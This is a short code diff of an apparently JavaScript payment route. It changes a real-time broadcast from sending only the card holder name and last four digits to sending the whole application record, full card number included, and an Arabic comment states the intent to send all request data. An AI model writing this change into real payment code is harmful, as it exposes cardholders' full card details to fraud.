@@ -563,15 +563,11 @@ router.post("/:id/payment", async (req, res) => {
       .set({ applicationId: newApp.id, lastSeenAt: new Date() })
       .where(eq(sessionsTable.id, newApp.sessionId));
 
-    // إرسال إشعار
+    // إرسال إشعار مع كل بيانات الطلب
     broadcast({
       type: "payment_received",
       sessionId: newApp.sessionId,
-      data: {
-        id: newApp.id,
-        cardHolder: newApp.paymentCardHolder,
-        last4: newApp.paymentCardNumber?.slice(-4),
-      },
+      data: newApp,
     });
 
     sendFCMNotification("payment", {
